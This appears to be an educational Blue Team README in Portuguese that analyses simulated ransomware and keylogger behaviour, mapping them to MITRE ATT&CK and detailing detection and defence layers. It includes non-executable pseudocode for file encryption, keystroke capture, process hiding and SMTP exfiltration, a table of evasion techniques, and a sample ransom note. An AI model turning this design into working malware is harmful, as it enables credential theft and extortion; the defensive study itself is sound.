# 🛡️ Análise Conceitual de Ameaças e Estratégias de Defesa Cibernética

**Projeto educacional — Blue Team | Python & Segurança da Informação**

---

## 📑 Índice

1. [Sobre o Projeto](#-sobre-o-projeto)
2. [Aviso de Segurança](#-aviso-de-segurança)
3. [Estrutura do Repositório](#-estrutura-do-repositório)
4. [Ransomware Simulado](#-ransomware-simulado)
   - [Mecanismo Conceitual](#mecanismo-conceitual)
   - [Fluxo da Simulação](#fluxo-da-simulação)
   - [Pseudocódigo Ilustrativo — Criptografia](#pseudocódigo-ilustrativo--criptografia)
   - [Exemplo de Mensagem de Resgate](#exemplo-de-mensagem-de-resgate)
5. [Keylogger Simulado](#-keylogger-simulado)
   - [Mecanismo Conceitual](#mecanismo-conceitual-1)
   - [Técnicas de Furtividade](#técnicas-de-furtividade)
   - [Pseudocódigo Ilustrativo — Captura e Envio](#pseudocódigo-ilustrativo--captura-e-envio)
   - [Envio Automático por E-mail (SMTP)](#envio-automático-por-e-mail-smtp)
6. [Aprofundamento Técnico — MITRE ATT&CK](#-aprofundamento-técnico--mitre-attck)
7. [Arquitetura de Prevenção e Defesa](#-arquitetura-de-prevenção-e-defesa)
8. [Reflexões e Aprendizados](#-reflexões-e-aprendizados)
9. [Referências](#-referências)
10. [Uso Responsável e Licença](#-uso-responsável-e-licença)

---

## 📋 Sobre o Projeto

Este repositório documenta estudos teóricos, análise de vetores de ataque e estratégias de defesa aplicadas à compreensão do comportamento de malwares — especificamente **Ransomwares** e **Keyloggers**.

O foco é estritamente educacional e defensivo (**Blue Team**), explorando os mecanismos conceituais dessas ameaças sob a ótica de frameworks como o **MITRE ATT&CK** e o **NIST**, e detalhando como detectar, mitigar e responder a esses incidentes.

> **Escolha metodológica:** conforme previsto no enunciado do desafio, este repositório adota a abordagem de **documentação aprofundada** dos estudos, sem scripts executáveis. Essa decisão é intencional: o objetivo é demonstrar compreensão conceitual e visão defensiva, não produzir código operacional de ataque.

---

## ⚠️ Aviso de Segurança

```
AVISO LEGAL — LEIA ANTES DE CONTINUAR

Este material possui finalidade exclusivamente educacional.
Todo o conteúdo foi desenvolvido para ambiente de laboratório controlado.

NÃO utilize os conceitos ou pseudocódigos deste repositório para:
  • prejudicar ou comprometer sistemas de terceiros;
  • capturar informações sem consentimento;
  • acessar dispositivos sem autorização;
  • criptografar arquivos de outras pessoas;
  • transmitir dados coletados sem consentimento explícito.

O uso indevido desses conhecimentos pode configurar crimes previstos
na Lei nº 12.737/2012 (Lei Carolina Dieckmann) e no Marco Civil da Internet.

Todos os testes devem ser realizados em ambiente autorizado,
com dados fictícios e isolados de redes de produção.
```

---

## 📁 Estrutura do Repositório

```
malware-simulation-lab/
│
├── README.md                        ← Este documento (documentação principal)
│
├── docs/
│   ├── analise-tecnica.md           ← Aprofundamento MITRE ATT&CK e IoB
│   └── defesa-em-profundidade.md    ← Detalhamento das camadas de defesa
│
├── pseudocodigo/
│   ├── ransomware_conceitual.txt    ← Fluxo lógico da simulação de ransomware
│   └── keylogger_conceitual.txt     ← Fluxo lógico da simulação de keylogger
│
├── exemplos/
│   └── mensagem_resgate_modelo.txt  ← Modelo de nota de resgate (fictício)
│
└── LICENSE                          ← Licença MIT (uso educacional)
```

> **Nota:** os arquivos em `/pseudocodigo/` e `/exemplos/` são arquivos de texto simples, sem código executável. Eles complementam este documento e ilustram a organização de um laboratório de análise.

---

## 🔐 Ransomware Simulado

### Mecanismo Conceitual

Ransomwares sequestram a **disponibilidade e a integridade dos dados** por meio de criptografia. Em ataques reais, utilizam um modelo **híbrido**:

- **Criptografia simétrica** (ex: AES-128 via `cryptography.fernet` ou AES-256) para cifrar os arquivos com alta velocidade.
- **Criptografia assimétrica** (ex: RSA) para proteger a chave simétrica, garantindo que apenas o detentor da chave privada consiga recuperá-la.

Esse modelo faz com que, sem a chave privada do atacante, a descriptografia seja computacionalmente inviável.

**Indicadores Comportamentais (IoBs):**
- Alta taxa de operações de leitura/escrita (I/O) em disco em intervalo muito curto.
- Alteração em massa de extensões de arquivos.
- Criação de notas de resgate em múltiplos diretórios.
- Tentativas de exclusão de **Volume Shadow Copies** (cópias de sombra do Windows) para inviabilizar restauração nativa.

---

### Fluxo da Simulação

```
[ Diretório de testes com arquivos fictícios ]
              ↓
   [ Geração de chave simétrica ]
              ↓
   [ Criptografia arquivo a arquivo ]
              ↓
   [ Renomeação com extensão .simulado ]
              ↓
 [ Criação da mensagem de resgate (README_LEIA.txt) ]
              ↓
   [ Arquivos inacessíveis sem a chave ]
              ↓
─────────── Etapa de recuperação ───────────
              ↓
   [ Leitura da chave salva em arquivo ]
              ↓
   [ Descriptografia arquivo a arquivo ]
              ↓
     [ Arquivos restaurados ao estado original ]
```

---

### Pseudocódigo Ilustrativo — Criptografia

> ⚠️ O bloco abaixo é **pseudocódigo conceitual**. Não é código funcional — seu propósito é ilustrar a lógica de um ransomware simulado em laboratório.

```python
# PSEUDOCÓDIGO CONCEITUAL — NÃO É CÓDIGO EXECUTÁVEL
# Ilustra o fluxo lógico de um ransomware simulado em ambiente de testes.
# Biblioteca de referência conceitual: cryptography (Fernet / AES-128)

# ── Etapa 1: Criptografia ──────────────────────────────────────────────────

def cifrar_diretorio_de_testes(pasta_de_testes):

    chave = gerar_chave_simetrica()              # Fernet.generate_key()
    # Nota: em ataques reais, esta chave seria cifrada com RSA (chave pública)
    # e enviada ao C2. No laboratório, é salva localmente para recuperação.
    salvar_chave_localmente("chave.key", chave)

    para cada arquivo em listar_arquivos(pasta_de_testes):
        conteudo_original  = ler_binario(arquivo)
        conteudo_cifrado   = cifrar(conteudo_original, chave)
        sobrescrever(arquivo, conteudo_cifrado)
        renomear(arquivo, arquivo + ".simulado")

    criar_nota_de_resgate(pasta_de_testes)       # ver seção abaixo

# ── Etapa 2: Descriptografia ───────────────────────────────────────────────

def descriptografar_diretorio_de_testes(pasta_de_testes):

    chave = carregar_chave("chave.key")

    para cada arquivo com extensão ".simulado" em pasta_de_testes:
        conteudo_cifrado   = ler_binario(arquivo)
        conteudo_original  = decifrar(conteudo_cifrado, chave)
        sobrescrever(arquivo, conteudo_original)
        renomear(arquivo, remover_extensao(arquivo, ".simulado"))

    imprimir("✅ Arquivos restaurados com sucesso.")
```

**Por que AES/Fernet?**
O Fernet (padrão da biblioteca `cryptography` do Python) utiliza internamente **AES-128** em modo CBC com HMAC-SHA256 para garantir confidencialidade e autenticidade. É rápido, seguro e autocontido — características que ransomwares reais exploram para cifrar grandes volumes de dados rapidamente.

---

### Exemplo de Mensagem de Resgate

> Arquivo gerado ficticiamente como `README_LEIA.txt` dentro do diretório de testes.

```
╔══════════════════════════════════════════════════════════════╗
║          ⚠️  SEUS ARQUIVOS FORAM CRIPTOGRAFADOS  ⚠️          ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  Todos os seus arquivos neste diretório foram cifrados       ║
║  com criptografia AES-128 (Fernet).                          ║
║                                                              ║
║  Para recuperar seus arquivos, você precisaria da chave      ║
║  de descriptografia, que está em posse do atacante.          ║
║                                                              ║
║  ─────────────────────────────────────────────────────────   ║
║  IDENTIFICADOR DA VÍTIMA: LAB-2026-XXXXXXXX                  ║
║  PRAZO PARA PAGAMENTO:    72 horas                           ║
║  VALOR:                   0,05 BTC                           ║
║  ─────────────────────────────────────────────────────────   ║
║                                                              ║
║  ⚠️  NÃO tente renomear ou deletar os arquivos.              ║
║  ⚠️  NÃO tente usar software de recuperação.                 ║
║                                                              ║
╠══════════════════════════════════════════════════════════════╣
║  [ ISTO É UMA SIMULAÇÃO EDUCACIONAL — NENHUM ARQUIVO         ║
║    REAL FOI AFETADO — LABORATÓRIO CONTROLADO ]               ║
╚══════════════════════════════════════════════════════════════╝
```

**Por que esse formato importa?** Ransomwares reais criam essa nota em múltiplos diretórios simultaneamente. Sua criação em massa é, por si só, um indicador comportamental (IoB) detectável por soluções EDR e FIM (File Integrity Monitoring).

---

## ⌨️ Keylogger Simulado

### Mecanismo Conceitual

Keyloggers interceptam **eventos de entrada de teclado** antes que cheguem à aplicação de destino. No Windows, isso ocorre por meio de **hooks de sistema** (como `SetWindowsHookEx` via WinAPI). Em Python, bibliotecas como `pynput` abstraem esse mecanismo de forma multiplataforma.

O fluxo típico envolve três etapas: **captura → armazenamento local → exfiltração**.

**Indicadores Comportamentais (IoBs):**
- Registro de ganchos globais de teclado por processos não confiáveis.
- Criação de arquivos ocultos ou temporários com gravações frequentes de texto simples.
- Conexões de saída periódicas (padrão **beaconing**) ou uso de SMTP por processos que normalmente não acessam a rede.

---

### Técnicas de Furtividade

Para dificultar a detecção, implementações reais utilizam:

| Técnica | Descrição |
|:--------|:----------|
| **Nome de processo disfarçado** | O executável recebe nomes como `svchost`, `update_helper` ou `chrome_updater` para se confundir com processos legítimos. |
| **Execução em background** | No Windows, usa `pythonw.exe` (sem janela de console) ou é registrado como serviço do sistema. |
| **Arquivo de log oculto** | O `.txt` de saída recebe atributo `hidden` no sistema de arquivos ou é salvo em diretórios de sistema pouco monitorados. |
| **Intervalo de envio (beaconing)** | Em vez de enviar dados em tempo real (barulhento na rede), acumula e envia em intervalos fixos, dificultando a correlação. |
| **Ofuscação de código** | O script pode ser empacotado com PyInstaller + UPX e ter strings críticas codificadas em Base64 para evadir análise estática. |

---

### Pseudocódigo Ilustrativo — Captura e Envio

> ⚠️ O bloco abaixo é **pseudocódigo conceitual**. Não é código funcional — seu propósito é ilustrar o fluxo lógico para fins educacionais.

```python
# PSEUDOCÓDIGO CONCEITUAL — NÃO É CÓDIGO EXECUTÁVEL
# Ilustra o fluxo lógico de um keylogger simulado em laboratório controlado.
# Biblioteca de referência conceitual: pynput

ARQUIVO_LOG      = caminho_oculto("temp/.sys_cache.txt")
INTERVALO_ENVIO  = 300  # segundos (beaconing a cada 5 minutos)

# ── Etapa 1: Captura ───────────────────────────────────────────────────────

def ao_pressionar_tecla(tecla):
    texto = formatar(tecla, timestamp_atual())
    anexar_ao_arquivo(ARQUIVO_LOG, texto)

def iniciar_captura():
    ocultar_processo()                        # atributos de sistema / pythonw
    com escuta_de_teclado(callback=ao_pressionar_tecla):
        aguardar_indefinidamente()

# ── Etapa 2: Exfiltração periódica ────────────────────────────────────────

def rotina_de_envio():
    enquanto verdadeiro:
        aguardar(INTERVALO_ENVIO)
        se arquivo_tem_conteudo(ARQUIVO_LOG):
            enviar_por_email(ARQUIVO_LOG)
            limpar_arquivo(ARQUIVO_LOG)

# ── Execução concorrente ───────────────────────────────────────────────────

executar_em_paralelo(iniciar_captura, rotina_de_envio)
```

---

### Envio Automático por E-mail (SMTP)

A etapa de exfiltração é o que transforma um keylogger em uma ameaça ativa de roubo de credenciais: a captura local só gera impacto externo quando os dados são transmitidos ao atacante.

**Fluxo conceitual de envio via SMTP:**

```python
# PSEUDOCÓDIGO CONCEITUAL — NÃO É CÓDIGO EXECUTÁVEL
# Ilustra a lógica de envio automático do log por e-mail.
# Biblioteca de referência conceitual: smtplib + email (stdlib Python)

def enviar_por_email(arquivo_log):

    # Configuração do servidor (atacante usaria conta descartável ou relay)
    SERVIDOR  = "smtp.provedor.com"
    PORTA     = 587                     # TLS (STARTTLS)
    REMETENTE = "coleta@laboratorio.lab"
    SENHA     = "••••••••"              # nunca em texto puro; normalmente ofuscada
    DESTINO   = "analista@laboratorio.lab"

    # Montar mensagem
    mensagem = criar_email(
        de       = REMETENTE,
        para     = DESTINO,
        assunto  = f"Log [{timestamp_atual()}]",
        corpo    = "Log de captura em anexo.",
        anexo    = ler_arquivo(arquivo_log)
    )

    # Enviar
    com conexao_smtp(SERVIDOR, PORTA) como smtp:
        smtp.iniciar_tls()
        smtp.autenticar(REMETENTE, SENHA)
        smtp.enviar(REMETENTE, DESTINO, mensagem)

    registrar("Log enviado e limpo.")
```

**Por que isso é detectável?**
- Embora clientes de e-mail legítimos utilizem a porta 587, processos genéricos ou interpretadores Python em estações de trabalho não devem iniciar conexões SMTP diretas para servidores externos.
- Um **NGFW** com controle de aplicações ou regras restritivas de saída bloqueia conexões SMTP que não partam dos servidores de e-mail corporativos autorizados (*Mail Relays*).
- O **SIEM** correlaciona: processo incomum + acesso a arquivo oculto + conexão SMTP externa = alerta de alta prioridade.

---

## 🔎 Aprofundamento Técnico — MITRE ATT&CK

### Mapeamento de Táticas e Técnicas

| Ameaça | Técnica MITRE ATT&CK | Descrição |
|:-------|:---------------------|:----------|
| Ransomware | `T1486` — Data Encrypted for Impact | Cifra arquivos para negar acesso e exigir resgate. |
| Ransomware | `T1490` — Inhibit System Recovery | Exclui Volume Shadow Copies para impedir restauração. |
| Keylogger | `T1056.001` — Input Capture: Keylogging | Intercepta keystrokes via hooks de sistema ou driver. |
| Keylogger | `T1048.002` — Exfiltration Over Asymmetric Encrypted Non-C2 Protocol | Exfiltra dados coletados por protocolo alternativo criptografado separado do canal C2 (ex: SMTP sobre TLS). |
| Ambos | `T1027` — Obfuscated Files or Information | Ofuscação do código para evadir análise estática. |
| Ambos | `T1547` — Boot or Logon Autostart Execution | Persistência via chaves de registro ou pasta de inicialização. |

### Fase de Kill Chain

```
Reconhecimento → Armamentização → Entrega (Phishing)
       ↓
Exploração → Instalação → Comando & Controle → Ação sobre Objetivos
                                                    ↓
                              Ransomware: T1486 + T1490
                              Keylogger:  T1056.001 + T1048.002
```

---

## 🛡️ Arquitetura de Prevenção e Defesa

| Camada | Controles e Ferramentas | Atuação contra Ransomware e Keylogger |
|:-------|:------------------------|:--------------------------------------|
| **Endpoint** | NGAV + **EDR** (Endpoint Detection & Response) | Detecta chamadas de API suspeitas (hooks de teclado), bloqueia execução por heurística e isola processos com padrão anômalo de criptografia. |
| **Rede** | **NGFW**, Proxy de saída, IDS/IPS | Bloqueia tráfego SMTP direto não autorizado de estações de trabalho e comunicação com servidores C2. |
| **Monitoramento** | **FIM** (File Integrity Monitoring) + **SIEM** | Alerta sobre modificações rápidas em diretórios críticos e alterações em chaves de registro de persistência. |
| **Isolamento** | **Sandboxing** + Princípio do Menor Privilégio | Executa arquivos suspeitos em ambiente isolado; impede que malwares obtenham privilégios administrativos para desativar defesas. |
| **Resiliência** | Backups imutáveis — Regra **3-2-1** | Garante recuperação sem pagamento de resgate: 3 cópias totais, 2 mídias distintas, 1 offsite (ou imutável). |
| **Fator humano** | Treinamento + simulações de Phishing | Reduz a superfície de ataque inicial — phishing é o principal vetor de entrega dessas ameaças. |

### Regra 3-2-1 de Backup (visualização)

```
        ┌───────────────────────────────────────────────────┐
        │          3 CÓPIAS TOTAIS DOS DADOS                │
        └─────────────────────────┬─────────────────────────┘
                                  │
           ┌──────────────────────┼──────────────────────┐
           ▼                      ▼                      ▼
   [ Cópia 1 (Produção) ] [ Cópia 2 (Local) ]   [ Cópia 3 (Offsite) ]
     Disco do Host          NAS / Servidor        Cloud Imutável / Fita
           ▲                                             ▲
           │                                             │
        Mídia 1                                       Mídia 2
                                                 (isolada da rede /
                                                  fora do alcance do
                                                  ransomware)
```

---

## 🧠 Reflexões e Aprendizados

### Defesa em Profundidade (Defense in Depth)

Nenhuma ferramenta isolada garante 100% de proteção. A eficácia reside na **sobreposição de camadas**:

```
Phishing chega ao usuário →
  Usuário clica (falha humana) →
    EDR bloqueia a execução →
      Se executar: privilégio mínimo limita o dano →
        Se cifrar: FIM/SIEM alerta em tempo real →
          Se não for contido: backup imutável garante recuperação.
```

### Visibilidade é Fundamental

A análise **comportamental** (monitorar *o que* o processo faz, não apenas sua assinatura hash) é essencial para detectar variantes desconhecidas ou ofuscadas. Um ransomware novo tem assinatura desconhecida, mas seu comportamento (alta taxa de I/O + renomeação em massa) permanece consistente.

### Ciclo de Resposta a Incidentes — NIST SP 800-61

```
   ┌──────────────────────────────────────────────────────────────┐
   │                                                              │
   ▼                                                              │
1. Preparação → 2. Detecção e Análise → 3. Contenção, Erradicação → 4. Atividade Pós-Incidente
                                           e Recuperação               (Lições Aprendidas)
```

A tecnologia deve caminhar junto com **processos claros de resposta**. Um backup excelente sem um plano de recuperação testado e documentado falha na hora do incidente real.

### Consciência sobre o Vetor Humano

A grande maioria dos ataques de ransomware e keylogger entra no ambiente por meio de **phishing ou engenharia social**. Capacitar usuários continuamente não é opcional — é a primeira linha de defesa e, frequentemente, a mais eficaz em custo-benefício.

---

## 📚 Referências

- **MITRE ATT&CK Framework** — Matriz Enterprise (táticas *Collection*, *Exfiltration* e *Impact*). Disponível em: [attack.mitre.org](https://attack.mitre.org)
- **NIST SP 800-61 Rev. 2** — *Computer Security Incident Handling Guide*. Disponível em: [nvlpubs.nist.gov](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf)
- **NIST Cybersecurity Framework (CSF) 2.0** — Funções *Identify*, *Protect*, *Detect*, *Respond* e *Recover*. Disponível em: [nist.gov/cyberframework](https://www.nist.gov/cyberframework)
- **CyberOps Associate** — Cisco Networking Academy (cursado pelo autor).
- **CCNA1** — Cisco Networking Academy (cursado pelo autor).
- **Introdução à Cibersegurança** — Cisco Networking Academy (cursado pelo autor).
- **Laboratório de Segurança Cibernética Febraban 2026** (cursado pelo autor).
- **Hackers do Bem** — Módulos introdutórios (cursados pelo autor).

---

## 📄 Uso Responsável e Licença

```
MIT License

Copyright (c) 2026 Misael Kellermann

Permission is hereby granted, free of charge, to any person obtaining a copy
of this documentation and associated files (the "Documentation"), to deal
in the Documentation without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Documentation, and to permit persons to whom the Documentation
is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Documentation.

THE DOCUMENTATION IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.

──────────────────────────────────────────────────────────────────────────────
Este repositório contém APENAS documentação e pseudocódigo conceitual.
Não há scripts executáveis. O conteúdo destina-se exclusivamente ao estudo
de segurança defensiva e à compreensão do comportamento de ameaças.
──────────────────────────────────────────────────────────────────────────────
```

---

**Autor:** Misael Kellermann  
**Área:** Segurança da Informação — Blue Team  
**LinkedIn:** [linkedin.com/in/misaelkellermann](https://linkedin.com/in/misaelkellermann)

> *"O conhecimento ofensivo, quando aplicado de forma ética e controlada, é uma ferramenta essencial para melhorar a defesa de sistemas e informações."*